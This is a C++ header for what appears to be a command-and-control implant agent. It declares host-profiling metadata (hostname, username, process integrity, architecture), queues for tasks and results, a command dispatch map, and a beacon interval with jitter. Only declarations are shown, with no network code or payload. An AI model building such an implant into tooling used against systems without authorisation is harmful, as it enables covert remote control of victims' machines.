#pragma once
#include <string>
#include <atomic>
#include <queue>
#include <unordered_map>
#include "Helpers.h"

struct AgentMetadata
{
	int id;
	std::string hostname;
	std::string username;
	std::string processname;
	int pid;
	std::string integrity;
	std::string arch;

	std::string to_json() {
		std::ostringstream oss;
		oss << "{"
			<< "\"id\":" << id << ","
			<< "\"hostname\":\"" << hostname << "\","
			<< "\"username\":\"" << username << "\","
			<< "\"processname\":\"" << processname << "\","
			<< "\"pid\":" << pid << ","
			<< "\"integrity\":\"" << integrity << "\","
			<< "\"arch\":\"" << arch << "\""
			<< "}";
		return oss.str();
	}
};

class Agent
{
private:
	AgentMetadata Metadata;
	std::queue<Task> Tasks;
	std::queue<TaskResult> Results;
	std::unordered_map<std::string, std::string(*)(std::vector<std::string> arguments)> Commands;
	std::atomic<DWORD> BeaconIntervalMs;
	std::atomic<DWORD> BeaconJitterMs;

public:
	Agent();

	std::unordered_map<std::string, std::string(*)(std::vector<std::string> arguments)> loadCommands();

	AgentMetadata generateMetadata();

	AgentMetadata getMetadata();

	void addTask(const Task& task);

	Task getNextTask();

	void addResult(const TaskResult& result);

	TaskResult getNextResult();

	std::vector<TaskResult> getTaskResults();

	DWORD getBeaconIntervalMs() const { return BeaconIntervalMs.load(); }
	DWORD getBeaconJitterMs()   const { return BeaconJitterMs.load(); }
	void  setBeaconIntervalMs(DWORD ms) { BeaconIntervalMs.store(ms); }
	void  setBeaconJitterMs(DWORD ms)   { BeaconJitterMs.store(ms); }

	void executeTask(Task& task);

	void Work();

};